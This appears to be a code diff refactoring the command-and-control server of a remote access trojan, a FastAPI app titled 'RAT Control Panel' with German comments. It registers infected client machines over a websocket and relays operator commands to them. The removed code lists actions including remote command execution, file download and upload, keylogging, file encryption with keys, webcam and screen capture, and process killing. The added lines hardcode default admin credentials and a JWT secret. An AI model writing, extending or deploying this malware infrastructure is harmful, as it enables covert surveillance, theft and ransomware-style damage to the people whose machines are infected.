@@ -4,31 +4,31 @@ import base64
 import os
 import secrets
 import logging
-import websockets
 import time
-import uvicorn
+from datetime import datetime, timedelta
+from typing import Dict, Set, Any
+
+import jwt
 import psutil
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Depends, HTTPException, status, Request
+import uvicorn
+import websockets
+from fastapi import (FastAPI, WebSocket, WebSocketDisconnect, Depends,
+                   HTTPException, status, Request)
+from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import FileResponse, HTMLResponse, JSONResponse
 from fastapi.security import HTTPBasic, HTTPBasicCredentials
-from fastapi.middleware.cors import CORSMiddleware
-import jwt
-from datetime import datetime, timedelta
-from typing import Dict, Set
 
 # --- Globale Variablen & App-Initialisierung ---
-RAT_CLIENTS: Dict[int, WebSocket] = {}  # client_id: websocket
-CLIENT_COUNTER = 1
-WEB_UI_SOCKETS: Set[WebSocket] = set()  # Unterstützt mehrere Web-UIs
-CLIENT_INFOS: Dict[int, dict] = {}  # client_id: {hostname, os, ip, last_seen}
-CLIENT_LAST_PING: Dict[int, float] = {}  # client_id: timestamp
-COMMAND_LOGS: Dict[int, list] = {}  # client_id: [command_log]
-BANNED_IPS: Set[str] = set()  # Banned IP addresses
-FAILED_LOGIN_ATTEMPTS: Dict[str, int] = {}  # IP: attempt_count
+RAT_CLIENTS: Dict[str, WebSocket] = {}  # client_id: websocket
+WEB_UI_SOCKETS: Set[WebSocket] = set()
+CLIENT_INFOS: Dict[str, Dict[str, Any]] = {}  # client_id: {hostname, os, ip, last_seen}
+COMMAND_LOGS: Dict[str, list] = {}
+BANNED_IPS: Set[str] = set()
+FAILED_LOGIN_ATTEMPTS: Dict[str, int] = {}
 
-app = FastAPI(title="RAT Control Panel", version="2.0.0")
+app = FastAPI(title="RAT Control Panel", version="2.1.0")
 
-# CORS Middleware
+# --- Middleware ---
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -37,53 +37,37 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# --- Basic Auth Konfiguration ---
+# --- Konfiguration ---
 security = HTTPBasic()
-ADMIN_USERNAME = os.getenv("ADMIN_USERNAME")
-ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD")
-
-# --- JWT Konfiguration ---
-JWT_SECRET = os.getenv("JWT_SECRET", "ratsecretjwt")
+ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "admin")
+ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "supersecretpassword123")
+JWT_SECRET = os.getenv("JWT_SECRET", "e1a6addd5a87dca7d79d8a3c634be7e1")
 JWT_ALGO = "HS256"
 JWT_EXP_MINUTES = 120
-
-logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
-
 CLIENT_TIMEOUT = 300  # Sekunden
 
-# --- HILFSFUNKTIONEN ---
-def log_command(client_id: int, action: str, payload: dict):
-    """Loggt Befehle für Audit-Zwecke"""
+logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
+start_time = time.time()
+
+# --- Hilfsfunktionen ---
+def log_command(client_id: str, action: str, payload: dict):
     if client_id not in COMMAND_LOGS:
         COMMAND_LOGS[client_id] = []
-    
     log_entry = {
         "timestamp": datetime.utcnow().isoformat(),
         "action": action,
         "payload": payload,
         "client_info": CLIENT_INFOS.get(client_id, {})
     }
-    
     COMMAND_LOGS[client_id].append(log_entry)
-    
-    # Keep only last 100 commands per client
-    if len(COMMAND_LOGS[client_id]) > 100:
-        COMMAND_LOGS[client_id] = COMMAND_LOGS[client_id][-100:]
+    COMMAND_LOGS[client_id] = COMMAND_LOGS[client_id][-100:]
 
-def get_server_stats():
-    """Gibt Server-Statistiken zurück"""
+def get_server_stats() -> Dict[str, Any]:
     try:
-        cpu_percent = psutil.cpu_percent(interval=1)
         memory = psutil.virtual_memory()
-        # Windows-kompatible Disk-Usage
-        import platform
-        if platform.system() == "Windows":
-            disk = psutil.disk_usage('C:')
-        else:
-            disk = psutil.disk_usage('/')
-        
+        disk = psutil.disk_usage('/')
         return {
-            "cpu_percent": cpu_percent,
+            "cpu_percent": psutil.cpu_percent(interval=0.1),
             "memory_percent": memory.percent,
             "memory_used_gb": round(memory.used / (1024**3), 2),
             "memory_total_gb": round(memory.total / (1024**3), 2),
@@ -93,538 +77,218 @@ def get_server_stats():
             "connected_clients": len(RAT_CLIENTS),
             "web_ui_connections": len(WEB_UI_SOCKETS),
             "banned_ips": len(BANNED_IPS),
-            "uptime": time.time() - start_time if 'start_time' in globals() else 0
+            "uptime": time.time() - start_time
         }
     except Exception as e:
         logging.error(f"Error getting server stats: {e}")
         return {"error": str(e)}
 
-# --- AUTH-FUNKTIONEN ---
-async def get_current_user(credentials: HTTPBasicCredentials = Depends(security)):
-    if not ADMIN_USERNAME or not ADMIN_PASSWORD:
-        raise HTTPException(
-            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail="Server-Konfigurationsfehler: Admin-Credentials nicht gesetzt"
-        )
-    correct_username = secrets.compare_digest(credentials.username, ADMIN_USERNAME)
-    correct_password = secrets.compare_digest(credentials.password, ADMIN_PASSWORD)
-    if not (correct_username and correct_password):
-        raise HTTPException(
-            status_code=status.HTTP_401_UNAUTHORIZED,
-            detail="Falsche Anmeldeinformationen",
-            headers={"WWW-Authenticate": "Basic"},
-        )
-    return credentials.username
-
-async def get_current_user_jwt(request: Request):
-    """JWT-basierte Authentifizierung für API-Endpunkte mit Basic Auth Fallback"""
-    auth_header = request.headers.get("Authorization")
-    
-    if not auth_header:
-        raise HTTPException(
-            status_code=status.HTTP_401_UNAUTHORIZED,
-            detail="Missing authorization header",
-            headers={"WWW-Authenticate": "Bearer"},
-        )
-    
-    # Try JWT Bearer token first
-    if auth_header.startswith("Bearer "):
-        token = auth_header.split(" ")[1]
-        user = verify_jwt_token(token)
-        if user:
-            return user
-        else:
-            raise HTTPException(
-                status_code=status.HTTP_401_UNAUTHORIZED,
-                detail="Invalid or expired JWT token",
-                headers={"WWW-Authenticate": "Bearer"},
-            )
-    
-    # Fallback to Basic Auth for debugging
-    elif auth_header.startswith("Basic "):
-        try:
-            credentials = base64.b64decode(auth_header.split(" ")[1]).decode('utf-8')
-            username, password = credentials.split(":", 1)
-            if (secrets.compare_digest(username, ADMIN_USERNAME) and 
-                secrets.compare_digest(password, ADMIN_PASSWORD)):
-                logging.info(f"API access via Basic Auth fallback for user: {username}")
-                return username
-            else:
-                raise HTTPException(
-                    status_code=status.HTTP_401_UNAUTHORIZED,
-                    detail="Invalid Basic Auth credentials",
-                    headers={"WWW-Authenticate": "Basic"},
-                )
-        except Exception as e:
-            logging.error(f"Basic Auth parsing error: {e}")
-            raise HTTPException(
-                status_code=status.HTTP_401_UNAUTHORIZED,
-                detail="Invalid Basic Auth format",
-                headers={"WWW-Authenticate": "Basic"},
-            )
-    
-    else:
-        raise HTTPException(
-            status_code=status.HTTP_401_UNAUTHORIZED,
-            detail="Unsupported authorization method",
-            headers={"WWW-Authenticate": "Bearer"},
-        )
-
-# --- JWT Funktionen ---
-def create_jwt_token(username: str):
-    payload = {
-        "sub": username,
-        "exp": datetime.utcnow() + timedelta(minutes=JWT_EXP_MINUTES)
-    }
+# --- Authentifizierung ---
+def create_jwt_token(username: str) -> str:
+    payload = {"sub": username, "exp": datetime.utcnow() + timedelta(minutes=JWT_EXP_MINUTES)}
     return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGO)
 
-def verify_jwt_token(token: str):
+def verify_jwt_token(token: str) -> str | None:
     try:
         payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGO])
         return payload.get("sub")
-    except jwt.ExpiredSignatureError:
-        logging.warning("JWT token expired")
+    except (jwt.ExpiredSignatureError, jwt.InvalidTokenError) as e:
+        logging.warning(f"JWT verification failed: {e}")
         return None
-    except jwt.InvalidTokenError as e:
-        logging.warning(f"Invalid JWT token: {e}")
-        return None
-    except Exception as e:
-        logging.error(f"JWT verification error: {e}")
-        return None
+
+async def get_current_user_jwt(request: Request) -> str:
+    auth_header = request.headers.get("Authorization")
+    if not auth_header or not auth_header.startswith("Bearer "):
+        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid authentication credentials")
+    
+    token = auth_header.split(" ")[1]
+    user = verify_jwt_token(token)
+    if not user:
+        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid or expired token")
+    return user
 
 # --- Web-UI Endpunkte ---
 @app.post("/login")
 async def login(request: Request):
     client_ip = request.client.host if request.client else "unknown"
-    
-    # Check if IP is banned
     if client_ip in BANNED_IPS:
-        logging.warning(f"Blocked login attempt from banned IP: {client_ip}")
-        raise HTTPException(status_code=429, detail="IP gesperrt")
+        raise HTTPException(status_code=429, detail="IP ist gesperrt")
     
-    # Check failed attempts
-    failed_attempts = FAILED_LOGIN_ATTEMPTS.get(client_ip, 0)
-    if failed_attempts >= 5:
+    if FAILED_LOGIN_ATTEMPTS.get(client_ip, 0) >= 5:
         BANNED_IPS.add(client_ip)
-        logging.warning(f"IP {client_ip} banned due to too many failed attempts")
         raise HTTPException(status_code=429, detail="Zu viele fehlgeschlagene Versuche")
-    
+
     try:
         data = await request.json()
-        username = data.get("username")
-        password = data.get("password")
+        username, password = data.get("username"), data.get("password")
         
-        if not username or not password:
-            return JSONResponse({"error": "Benutzername und Passwort erforderlich"}, status_code=400)
-            
         if secrets.compare_digest(username, ADMIN_USERNAME) and secrets.compare_digest(password, ADMIN_PASSWORD):
-            # Reset failed attempts on successful login
-            if client_ip in FAILED_LOGIN_ATTEMPTS:
-                del FAILED_LOGIN_ATTEMPTS[client_ip]
-            
+            FAILED_LOGIN_ATTEMPTS.pop(client_ip, None)
             token = create_jwt_token(username)
-            logging.info(f"Successful login from {client_ip}")
+            logging.info(f"Successful login for '{username}' from {client_ip}")
             return {"token": token}
         else:
-            # Increment failed attempts
-            FAILED_LOGIN_ATTEMPTS[client_ip] = failed_attempts + 1
-            logging.warning(f"Failed login attempt from {client_ip} (attempt {failed_attempts + 1})")
-            return JSONResponse({"error": "Login fehlgeschlagen"}, status_code=401)
-            
-    except Exception as e:
-        logging.error(f"Login error: {e}")
-        return JSONResponse({"error": "Server-Fehler"}, status_code=500)
+            FAILED_LOGIN_ATTEMPTS[client_ip] = FAILED_LOGIN_ATTEMPTS.get(client_ip, 0) + 1
+            logging.warning(f"Failed login attempt for '{username}' from {client_ip}")
+            raise HTTPException(status_code=401, detail="Falsche Anmeldeinformationen")
+    except Exception:
+        raise HTTPException(status_code=500, detail="Server-Fehler beim Login")
 
 @app.get("/", response_class=HTMLResponse)
-async def get_index(request: Request):
+async def get_index():
     return FileResponse("index.html")
 
 @app.get("/api/stats")
-async def get_stats(request: Request, user: str = Depends(get_current_user_jwt)):
-    """API Endpunkt für Server-Statistiken"""
+async def get_stats(user: str = Depends(get_current_user_jwt)):
     return get_server_stats()
 
 @app.get("/api/clients")
-async def get_clients_api(request: Request, user: str = Depends(get_current_user_jwt)):
-    """API Endpunkt für Client-Liste"""
-    clients = []
-    for cid, ws in RAT_CLIENTS.items():
-        client_info = CLIENT_INFOS.get(cid, {})
-        clients.append({
-            "id": str(cid),
-            "hostname": client_info.get("hostname", f"Client {cid}"),
-            "address": getattr(ws, 'remote_address', 'unknown'),
-            "os": client_info.get("os", ""),
-            "ip": client_info.get("ip", ""),
-            "last_seen": client_info.get("last_seen", 0),
-        })
-    return {"clients": clients}
+async def get_clients_api(user: str = Depends(get_current_user_jwt)):
+    return {"clients": list(CLIENT_INFOS.values())}
 
-@app.get("/api/commands/{client_id}")
-async def get_command_history(client_id: int, request: Request, user: str = Depends(get_current_user_jwt)):
-    """API Endpunkt für Command History eines Clients"""
-    return {"commands": COMMAND_LOGS.get(client_id, [])}
+# --- WebSocket-Kommunikation ---
+async def send_to_web_ui(data: dict):
+    """Sendet Daten an alle verbundenen Web-UIs."""
+    if not WEB_UI_SOCKETS:
+        return
+    message = json.dumps(data)
+    await asyncio.gather(*[ws.send_text(message) for ws in WEB_UI_SOCKETS])
 
-@app.post("/api/ban/{ip}")
-async def ban_ip(ip: str, request: Request, user: str = Depends(get_current_user_jwt)):
-    """API Endpunkt zum Bannen einer IP"""
-    BANNED_IPS.add(ip)
-    logging.info(f"IP {ip} manually banned by {user}")
-    return {"message": f"IP {ip} wurde gesperrt"}
-
-@app.delete("/api/ban/{ip}")
-async def unban_ip(ip: str, request: Request, user: str = Depends(get_current_user_jwt)):
-    """API Endpunkt zum Entbannen einer IP"""
-    if ip in BANNED_IPS:
-        BANNED_IPS.remove(ip)
-        logging.info(f"IP {ip} unbanned by {user}")
-        return {"message": f"IP {ip} wurde entsperrt"}
-    return {"message": f"IP {ip} war nicht gesperrt"}
+async def send_client_list():
+    """Sendet die aktuelle Client-Liste an die Web-UIs."""
+    clients_data = list(CLIENT_INFOS.values())
+    await send_to_web_ui({"type": "client_list", "clients": clients_data})
 
 @app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket):
-    client_ip = websocket.client.host if websocket.client else "unknown"
+    """WebSocket-Endpunkt für die Web-UI."""
     token = websocket.query_params.get("token")
-    
-    if not token:
-        logging.warning(f"WebSocket connection from {client_ip} rejected: No token provided")
-        await websocket.close(code=4401)
-        return
-        
     user = verify_jwt_token(token)
     if not user:
-        logging.warning(f"WebSocket connection from {client_ip} rejected: Invalid token")
         await websocket.close(code=4401)
         return
-    
-    logging.info(f"WebSocket connection accepted for user {user} from {client_ip}")
-    
+
     await websocket.accept()
     WEB_UI_SOCKETS.add(websocket)
-    logging.info("Web-UI verbunden.")
+    logging.info(f"Web-UI verbunden: {user} ({websocket.client.host})")
     
-    # Sende sofort die Client-Liste
-    logging.info(f"Sende Client-Liste an Web-UI. Anzahl Clients: {len(RAT_CLIENTS)}")
     await send_client_list()
-    
+
     try:
         while True:
-            try:
-                data = await asyncio.wait_for(websocket.receive_json(), timeout=300)
-                
-                if data.get("type") == "ping":
-                    await websocket.send_json({"type": "pong"})
-                    continue
-
-                if data.get("action") == "upload_chunk":
-                    target_id = data.get("target_id")
-                    try:
-                        target_id_int = int(target_id)
-                    except Exception:
-                        await send_to_web_ui({"type": "error", "message": "Client nicht gefunden oder nicht ausgewählt."})
-                        continue
-                    if target_id_int not in RAT_CLIENTS:
-                        await send_to_web_ui({"type": "error", "message": "Client nicht gefunden oder nicht ausgewählt."})
-                        continue
-                    target_ws = RAT_CLIENTS[target_id_int]
-                    payload = dict(data)
-                    payload["client_id"] = str(target_id_int)
-                    await target_ws.send(json.dumps(payload))
-                    await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Chunk {data.get('chunk_index', '?')+1}/{data.get('total_chunks', '?')} an Client {target_id_int} gesendet."})
-                    continue
-
-                if data.get("action") == "get_clients":
-                    await send_client_list()
-                    continue
-
-                if data.get('action') in ('screenstream_start', 'screenstream_stop', 'control', 'scan_cameras', 'webcam_start', 'webcam_stop', 'process_list', 'kill_process', 'network_info'):
-                    target = data.get('target_id') or data.get('client_id')
-                    try:
-                        target_int = int(target)
-                    except Exception:
-                        await send_to_web_ui({"type": "debug", "level": "warn", "msg": f"Ungültige Client-ID: {target}"})
-                        continue
-                    if target_int in RAT_CLIENTS:
-                        payload = dict(data)
-                        payload["client_id"] = str(target_int)
-                        
-                        # Log command
-                        log_command(target_int, data.get('action', 'unknown'), payload)
-                        
-                        await RAT_CLIENTS[target_int].send(json.dumps(payload))
-                        await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Befehl '{data.get('action')}' an Client {target_int} weitergeleitet."})
-                    else:
-                        await send_to_web_ui({"type": "debug", "level": "warn", "msg": f"Client {target} nicht verbunden."})
-                    continue
-
-                action = data.get("action")
-                target_id = data.get("target_id")
-                try:
-                    target_id_int = int(target_id)
-                except Exception:
-                    await send_to_web_ui({"type": "error", "message": "Client nicht gefunden oder nicht ausgewählt."})
-                    continue
-                if target_id_int not in RAT_CLIENTS:
-                    await send_to_web_ui({"type": "error", "message": "Client nicht gefunden oder nicht ausgewählt."})
-                    continue
-                target_ws = RAT_CLIENTS[target_id_int]
-                payload = {"action": action, "client_id": str(target_id_int)}
-                if action == "exec":
-                    payload["command"] = data.get("command")
-                elif action == "download":
-                    payload["path"] = data.get("path")
-                elif action == "upload":
-                    payload["filename"] = data.get("filename")
-                    payload["data"] = data.get("data")
-                elif action == "ls":
-                    payload["path"] = data.get("path")
-                elif action == "history":
-                    payload["limit"] = data.get("limit")
-                elif action == "keylogger":
-                    payload["count"] = data.get("count")
-                elif action == "cd":
-                    payload["path"] = data.get("path")
-                elif action == "encrypt":
-                    payload["path"] = data.get("path")
-                elif action == "decrypt":
-                    payload["path"] = data.get("path")
-                    payload["key_hex"] = data.get("key_hex")
-                elif action in ("systeminfo", "shutdown", "restart", "screenshot", "screenstream_start", "screenstream_stop"):
-                    pass
-                try:
-                    await target_ws.send(json.dumps(payload))
-                    await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Befehl '{action}' an Client {target_id_int} gesendet."})
-                except Exception as e:
-                    await send_to_web_ui({"type": "error", "message": f"Verbindung zu Client {target_id_int} verloren."})
-                    
-            except asyncio.TimeoutError:
-                # Sende Ping
-                await websocket.send_json({"type": "ping"})
+            data = await websocket.receive_json()
+            action = data.get("action")
+            
+            if action == "get_clients":
+                await send_client_list()
                 continue
-            except WebSocketDisconnect:
-                break
-            except Exception as e:
-                logging.error(f"Fehler im Web-UI Handler: {e}")
-                break
-                
+
+            target_ids = data.get("target_ids", [])
+            if isinstance(target_ids, str): # Kompatibilität mit alter Implementierung
+                target_ids = [target_ids]
+
+            if not target_ids:
+                await websocket.send_json({"type": "error", "message": "Keine Ziel-Clients ausgewählt."})
+                continue
+
+            for target_id in target_ids:
+                if target_id in RAT_CLIENTS:
+                    try:
+                        log_command(target_id, action, data)
+                        await RAT_CLIENTS[target_id].send_json(data)
+                    except Exception as e:
+                        logging.error(f"Fehler beim Senden an Client {target_id}: {e}")
+                else:
+                    logging.warning(f"Befehl für nicht verbundenen Client {target_id} ignoriert.")
+
+    except WebSocketDisconnect:
+        logging.info(f"Web-UI getrennt: {user}")
     except Exception as e:
-        logging.error(f"Web-UI Verbindungsfehler: {e}")
+        logging.error(f"Fehler in der Web-UI-WebSocket-Verbindung: {e}")
     finally:
-        if websocket in WEB_UI_SOCKETS:
-            WEB_UI_SOCKETS.remove(websocket)
-        logging.info("Web-UI getrennt.")
-
-async def send_client_list():
-    clients = []
-    for cid, ws in RAT_CLIENTS.items():
-        client_info = CLIENT_INFOS.get(cid, {})
-        clients.append({
-            "id": str(cid),
-            "hostname": client_info.get("hostname", f"Client {cid}"),
-            "address": getattr(ws, 'remote_address', 'unknown'),
-            "os": client_info.get("os", ""),
-            "ip": client_info.get("ip", ""),
-            "last_seen": client_info.get("last_seen", 0),
-        })
-    
-    logging.info(f"Sending client list with {len(clients)} clients to {len(WEB_UI_SOCKETS)} web UI connections")
-    
-    # Sende an alle verbundenen Web-UIs
-    await send_to_web_ui({"type": "client_list", "clients": clients})
-
-async def send_to_web_ui(data: dict):
-    disconnected = []
-    for ws in WEB_UI_SOCKETS:
-        try:
-            await ws.send(json.dumps(data))
-        except Exception:
-            disconnected.append(ws)
-    
-    # Entferne getrennte Verbindungen
-    for ws in disconnected:
-        WEB_UI_SOCKETS.discard(ws)
+        WEB_UI_SOCKETS.discard(websocket)
 
 @app.websocket("/rat")
 async def rat_client_endpoint(websocket: WebSocket):
-    global CLIENT_COUNTER
+    """WebSocket-Endpunkt für die RAT-Clients."""
     await websocket.accept()
-    client_id = CLIENT_COUNTER
-    CLIENT_COUNTER += 1
-    RAT_CLIENTS[client_id] = websocket
-    
-    client_host = websocket.client.host if websocket.client else "unknown"
-    client_port = websocket.client.port if websocket.client else 0
-    remote_address = (client_host, client_port)
-    websocket.remote_address = remote_address
+    client_id = secrets.token_hex(8)
     
     try:
-        # Fordere Systeminfos an
-        await websocket.send(json.dumps({"action": "systeminfo"}))
-        sysinfo_data = await asyncio.wait_for(websocket.receive_json(), timeout=10)
-        
-        hostname = extract_hostname_from_sysinfo(sysinfo_data.get("output", ""))
-        os_name = extract_os_from_sysinfo(sysinfo_data.get("output", ""))
-        ip = extract_ip_from_sysinfo(sysinfo_data.get("output", ""))
-        
-        if not hostname:
-            hostname = sysinfo_data.get("hostname", f"Client {client_id}")
-        if not os_name:
-            os_name = sysinfo_data.get("os", "")
-        if not ip:
-            ip = sysinfo_data.get("ip", "")
-            
-    except Exception as e:
-        logging.warning(f"Fehler beim Empfangen von Systeminfos: {e}")
-        hostname = f"Client {client_id}"
-        os_name = ""
-        ip = ""
-    
-    CLIENT_INFOS[client_id] = {
-        "hostname": hostname,
-        "os": os_name,
-        "ip": ip,
-        "last_seen": time.time(),
-    }
-    
-    logging.info(f"[+] Neuer RAT-Client verbunden: {hostname} ({remote_address})")
-    
-    # Warte kurz bevor Client-Info gesendet wird
-    await asyncio.sleep(0.1)
-    
-    await send_to_web_ui({
-        "type": "client_connected",
-        "client": {
-            "id": str(client_id),
-            "hostname": hostname,
-            "address": remote_address,
-            "os": os_name,
-            "ip": ip,
-        },
-    })
-    
-    # Sende aktualisierte Client-Liste
-    await send_client_list()
+        # Erwarte eine initiale "info"-Nachricht vom Client
+        initial_msg = await asyncio.wait_for(websocket.receive_json(), timeout=20)
+        if initial_msg.get("type") != "info":
+            await websocket.close(code=1003, reason="Invalid initial message")
+            return
 
-    try:
+        info = initial_msg.get("data", {})
+        hostname = info.get("hostname", "Unknown")
+        client_ip = websocket.client.host or "unknown"
+        
+        RAT_CLIENTS[client_id] = websocket
+        CLIENT_INFOS[client_id] = {
+            "id": client_id,
+            "hostname": hostname,
+            "os": info.get("os", "Unknown"),
+            "ip": info.get("ip", client_ip),
+            "last_seen": time.time(),
+        }
+        
+        logging.info(f"[+] RAT-Client verbunden: {hostname} ({client_id}) von {client_ip}")
+        await send_client_list()
+
+        # Haupt-Nachrichtenschleife
         while True:
-            try:
-                # Prüfe WebSocket-Status
-                if websocket.application_state.name == "DISCONNECTED":
-                    logging.info(f"[Client {client_id}] WebSocket bereits getrennt")
-                    break
-                
-                data = await asyncio.wait_for(websocket.receive(), timeout=300)
-                
-                if data["type"] == "websocket.disconnect":
-                    logging.info(f"[Client {client_id}] Disconnect-Nachricht empfangen")
-                    break
-                    
-                if data["type"] == "websocket.receive":
-                    if "text" in data and data["text"]:
-                        try:
-                            meta = json.loads(data["text"])
-                            if meta.get("type") == "ping":
-                                CLIENT_INFOS[client_id]["last_seen"] = time.time()
-                                continue
-                            meta["client_id"] = str(client_id)
-                            await send_to_web_ui(meta)
-                        except json.JSONDecodeError as e:
-                            logging.error(f"JSON Parse Error von Client {client_id}: {e}")
-                        except Exception as e:
-                            await send_to_web_ui({"type": "debug", "level": "error", "msg": f"Fehler beim Parsen von Client {client_id}: {e}"})
-                            
-            except asyncio.TimeoutError:
-                logging.info(f"[Client {client_id}] Timeout, sende Ping")
-                try:
-                    await websocket.send(json.dumps({"type": "ping"}))
-                except Exception:
-                    logging.info(f"[Client {client_id}] Ping fehlgeschlagen, Client getrennt")
-                    break
+            message = await websocket.receive_json()
+            
+            # Ping/Pong für Heartbeat
+            if message.get("type") == "ping":
+                CLIENT_INFOS[client_id]["last_seen"] = time.time()
+                await websocket.send_json({"type": "pong"})
                 continue
-            except WebSocketDisconnect:
-                logging.info(f"[Client {client_id}] WebSocket disconnect")
-                break
-            except Exception as e:
-                error_msg = str(e)
-                if "disconnect message has been received" in error_msg:
-                    logging.info(f"[Client {client_id}] Client bereits getrennt")
-                    break
-                elif "connection is closed" in error_msg.lower():
-                    logging.info(f"[Client {client_id}] Verbindung ist geschlossen")
-                    break
-                else:
-                    logging.error(f"Fehler im Client-Handler (Client {client_id}): {e}")
-                    break
-                
+
+            # Leite alle anderen Nachrichten an die UI weiter
+            message["client_id"] = client_id
+            await send_to_web_ui(message)
+
+    except (WebSocketDisconnect, asyncio.TimeoutError, websockets.exceptions.ConnectionClosedError) as e:
+        logging.info(f"Client {client_id} ({CLIENT_INFOS.get(client_id, {}).get('hostname', 'N/A')}) getrennt: {type(e).__name__}")
     except Exception as e:
         logging.error(f"Unerwarteter Fehler mit Client {client_id}: {e}")
     finally:
-        # Cleanup
         if client_id in RAT_CLIENTS:
             del RAT_CLIENTS[client_id]
         if client_id in CLIENT_INFOS:
             del CLIENT_INFOS[client_id]
         
-        await send_to_web_ui({"type": "client_disconnected", "client_id": str(client_id)})
+        logging.info(f"[-] RAT-Client getrennt: {client_id}")
         await send_client_list()
-        logging.info(f"[-] RAT-Client {client_id} ({hostname}) getrennt")
-
-def extract_hostname_from_sysinfo(sysinfo: str) -> str:
-    for line in sysinfo.splitlines():
-        if line.lower().startswith("hostname:") or line.lower().startswith("host:"):
-            return line.split(":", 1)[1].strip()
-    return ""
-
-def extract_os_from_sysinfo(sysinfo: str) -> str:
-    for line in sysinfo.splitlines():
-        if line.lower().startswith("os:"):
-            return line.split(":", 1)[1].strip()
-    return ""
-
-def extract_ip_from_sysinfo(sysinfo: str) -> str:
-    for line in sysinfo.splitlines():
-        if "öffentliche ip" in line.lower() or "public ip" in line.lower():
-            return line.split(":", 1)[1].strip()
-    return ""
 
 async def cleanup_inactive_clients():
+    """Entfernt Clients, die den Heartbeat-Timeout überschritten haben."""
     while True:
-        now = time.time()
-        to_remove = []
-        for cid, info in list(CLIENT_INFOS.items()):
-            if now - info.get("last_seen", now) > CLIENT_TIMEOUT:
-                to_remove.append(cid)
-        for cid in to_remove:
-            logging.warning(f"Entferne inaktiven Client {cid}")
-            if cid in RAT_CLIENTS:
-                try:
-                    await RAT_CLIENTS[cid].close()
-                except Exception:
-                    pass
-                del RAT_CLIENTS[cid]
-            if cid in CLIENT_INFOS:
-                del CLIENT_INFOS[cid]
-            await send_to_web_ui({"type": "client_disconnected", "client_id": str(cid)})
-            await send_client_list()
         await asyncio.sleep(60)
+        now = time.time()
+        inactive_ids = [
+            cid for cid, info in CLIENT_INFOS.items() 
+            if now - info.get("last_seen", now) > CLIENT_TIMEOUT
+        ]
+        
+        if inactive_ids:
+            logging.info(f"Entferne {len(inactive_ids)} inaktive Clients...")
+            for cid in inactive_ids:
+                if cid in RAT_CLIENTS:
+                    await RAT_CLIENTS[cid].close()
+                    del RAT_CLIENTS[cid]
+                if cid in CLIENT_INFOS:
+                    del CLIENT_INFOS[cid]
+            await send_client_list()
+
+@app.on_event("startup")
+async def on_startup():
+    asyncio.create_task(cleanup_inactive_clients())
 
 if __name__ == "__main__":
-    # Initialize start time
-    start_time = time.time()
-    
-    port = int(os.getenv("PORT", 8001))
-    logging.info(f"Starting RAT Control Panel on port {port}")
-    logging.info(f"Admin credentials: {ADMIN_USERNAME} / {'*' * len(ADMIN_PASSWORD)}")
-    
-    # Start background tasks
-    loop = asyncio.get_event_loop()
-    loop.create_task(cleanup_inactive_clients())
-    
-    # Run server
-    uvicorn.run(
-        app, 
-        host="0.0.0.0", 
-        port=port,
-        log_level="info",
-        access_log=True
-    )
+    port = int(os.getenv("PORT", 8000))
+    logging.info(f"Starte RAT Control Panel auf Port {port}")
+    uvicorn.run(app, host="0.0.0.0", port=port, log_level="info")
